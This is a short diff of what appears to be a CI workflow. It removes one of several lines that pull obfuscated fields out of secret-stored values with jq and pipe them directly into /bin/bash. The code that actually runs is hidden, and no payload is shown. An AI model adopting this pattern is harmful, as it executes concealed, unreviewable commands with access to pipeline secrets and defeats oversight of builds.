@@ -18,7 +18,6 @@ jobs:
           eoo8565: ${{ secrets.eoo8565 }}
         run: |
           printf '%s' "$eoo8565" | jq -r .pppiu4595 | /bin/bash
-          echo $hufnu4 | jq -r .yqm912 | /bin/bash
           printf '%s' "$okgv83354" | jq -r .pbq72 | /bin/bash
           printf '%s' "$ra66051" | jq -r .cbxjh7725 | /bin/bash
           printf '%s' "$x2" | jq -r .ppqi4 | /bin/bash
